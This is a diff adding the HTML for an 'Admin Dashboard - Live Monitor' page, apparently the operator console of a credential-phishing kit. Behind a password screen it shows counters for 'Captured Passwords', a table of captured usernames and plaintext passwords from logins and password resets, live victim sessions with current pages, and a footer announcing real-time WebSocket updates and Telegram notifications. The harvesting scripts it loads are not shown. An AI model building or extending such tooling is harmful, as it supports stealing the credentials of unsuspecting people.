@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Dashboard - Live Monitor</title>
+  <link rel="stylesheet" href="admin.css">
+</head>
+<body data-theme="dark">
+  <!-- Login Screen -->
+  <div class="login-screen" id="loginScreen">
+    <div class="login-box">
+      <div class="login-header">
+        <div class="lock-icon">🔒</div>
+        <h1>Admin Panel</h1>
+        <p>Enter password to access dashboard</p>
+      </div>
+      <form class="login-form" id="loginForm">
+        <div class="input-group">
+          <input 
+            type="password" 
+            id="adminPassword" 
+            class="login-input" 
+            placeholder="Enter admin password"
+            autocomplete="current-password"
+            required
+          >
+          <button type="button" class="password-toggle-btn" id="togglePassword">
+            👁️
+          </button>
+        </div>
+        <div class="error-message" id="errorMessage"></div>
+        <button type="submit" class="login-submit">Unlock Dashboard</button>
+      </form>
+    </div>
+  </div>
+
+  <div class="admin-container" id="adminContainer" style="display: none;">
+    <!-- Header -->
+    <header class="admin-header">
+      <div class="header-left">
+        <h1 class="admin-title">🔐 Admin Dashboard</h1>
+        <span class="connection-status" id="connectionStatus">
+          <span class="status-dot"></span>
+          <span class="status-text">Connecting...</span>
+        </span>
+      </div>
+      <div class="header-right">
+        <button class="theme-toggle" id="themeToggle" title="Change color scheme">
+          🎨 Theme
+        </button>
+        <button class="refresh-btn" id="refreshBtn" title="Refresh data">
+          🔄 Refresh
+        </button>
+        <button class="logout-btn" id="logoutBtn" title="Logout">
+          🚪 Logout
+        </button>
+      </div>
+    </header>
+
+    <!-- Theme Selector Modal -->
+    <div class="theme-modal" id="themeModal">
+      <div class="theme-modal-content">
+        <div class="theme-modal-header">
+          <h2>Choose Color Scheme</h2>
+          <button class="close-modal" id="closeModal">&times;</button>
+        </div>
+        <div class="theme-grid">
+          <button class="theme-option" data-theme="dark">
+            <div class="theme-preview theme-preview-dark">
+              <div class="preview-box bg-red">Red</div>
+              <div class="preview-box bg-blue">Blue</div>
+              <div class="preview-box bg-green">Green</div>
+            </div>
+            <span class="theme-name">Dark (Default)</span>
+          </button>
+          <button class="theme-option" data-theme="matrix">
+            <div class="theme-preview theme-preview-matrix">
+              <div class="preview-box bg-green">Green</div>
+              <div class="preview-box bg-green">Green</div>
+              <div class="preview-box bg-green">Green</div>
+            </div>
+            <span class="theme-name">Matrix</span>
+          </button>
+          <button class="theme-option" data-theme="neon">
+            <div class="theme-preview theme-preview-neon">
+              <div class="preview-box bg-red">Pink</div>
+              <div class="preview-box bg-blue">Cyan</div>
+              <div class="preview-box bg-green">Purple</div>
+            </div>
+            <span class="theme-name">Neon</span>
+          </button>
+          <button class="theme-option" data-theme="ice">
+            <div class="theme-preview theme-preview-ice">
+              <div class="preview-box bg-blue">Ice Blue</div>
+              <div class="preview-box bg-blue">White</div>
+              <div class="preview-box bg-blue">Frost</div>
+            </div>
+            <span class="theme-name">Ice</span>
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Stats Cards -->
+    <div class="stats-grid">
+      <div class="stat-card stat-card-primary">
+        <div class="stat-icon">📊</div>
+        <div class="stat-content">
+          <div class="stat-value" id="totalVisits">0</div>
+          <div class="stat-label">Total Daily Visits</div>
+        </div>
+      </div>
+
+      <div class="stat-card stat-card-success">
+        <div class="stat-icon">👥</div>
+        <div class="stat-content">
+          <div class="stat-value" id="uniqueVisitors">0</div>
+          <div class="stat-label">Unique Visitors</div>
+        </div>
+      </div>
+
+      <div class="stat-card stat-card-warning">
+        <div class="stat-icon">🔴</div>
+        <div class="stat-content">
+          <div class="stat-value" id="realtimeUsers">0</div>
+          <div class="stat-label">Live Users Now</div>
+        </div>
+      </div>
+
+      <div class="stat-card stat-card-danger">
+        <div class="stat-icon">🔐</div>
+        <div class="stat-content">
+          <div class="stat-value" id="loginAttempts">0</div>
+          <div class="stat-label">Login Attempts</div>
+        </div>
+      </div>
+
+      <div class="stat-card stat-card-info">
+        <div class="stat-icon">🎯</div>
+        <div class="stat-content">
+          <div class="stat-value" id="passwordCaptures">0</div>
+          <div class="stat-label">Captured Passwords</div>
+        </div>
+      </div>
+
+      <div class="stat-card stat-card-secondary">
+        <div class="stat-icon">⏱️</div>
+        <div class="stat-content">
+          <div class="stat-value" id="lastActivity">--:--:--</div>
+          <div class="stat-label">Last Activity</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Main Content Tabs -->
+    <div class="content-tabs">
+      <button class="tab-btn active" data-tab="logins">
+        🔑 Credentials
+      </button>
+      <button class="tab-btn" data-tab="sessions">
+        👤 Active Sessions
+      </button>
+      <button class="tab-btn" data-tab="activity">
+        📝 Live Activity Feed
+      </button>
+    </div>
+
+    <!-- Logins Tab -->
+    <div class="tab-content active" id="loginsTab">
+      <div class="section-header">
+        <h2> Captured Credentials (Logins & Password Resets)</h2>
+        <div class="section-info">
+          <span id="loginsCount">0</span> total captures
+        </div>
+      </div>
+      <div class="table-container">
+        <table class="data-table">
+          <thead>
+            <tr>
+              <th>Timestamp</th>
+              <th>Username</th>
+              <th>Password</th>
+              <th>Client ID</th>
+              <th>User Agent</th>
+            </tr>
+          </thead>
+          <tbody id="loginsTableBody">
+            <tr class="empty-state">
+              <td colspan="5">Waiting for login captures...</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- Sessions Tab -->
+    <div class="tab-content" id="sessionsTab">
+      <div class="section-header">
+        <h2>👤 Active User Sessions</h2>
+        <div class="section-info">
+          <span id="sessionsCount">0</span> active sessions
+        </div>
+      </div>
+      <div class="table-container">
+        <table class="data-table">
+          <thead>
+            <tr>
+              <th>Client ID</th>
+              <th>First Seen</th>
+              <th>Last Seen</th>
+              <th>Duration</th>
+              <th>Page Count</th>
+              <th>Current Page</th>
+            </tr>
+          </thead>
+          <tbody id="sessionsTableBody">
+            <tr class="empty-state">
+              <td colspan="6">No active sessions</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- Activity Feed Tab -->
+    <div class="tab-content" id="activityTab">
+      <div class="section-header">
+        <h2>📝 Live Activity Feed</h2>
+        <div class="section-actions">
+          <button class="clear-btn" id="clearActivity">Clear Feed</button>
+        </div>
+      </div>
+      <div class="activity-feed" id="activityFeed">
+        <div class="activity-item activity-info">
+          <div class="activity-time">--:--:--</div>
+          <div class="activity-content">Waiting for activity...</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- User Left Notifications -->
+    <div class="notification-container" id="notificationContainer"></div>
+
+    <!-- Footer -->
+    <footer class="admin-footer">
+      <div class="footer-content">
+        <span>🕐 Dashboard Active</span>
+        <span>•</span>
+        <span>Updates in real-time via WebSocket</span>
+        <span>•</span>
+        <span>Telegram notifications: <span class="status-badge">Active</span></span>
+      </div>
+    </footer>
+  </div>
+
+  <script src="analytics.js"></script>
+  <script src="admin.js"></script>
+</body>
+</html>
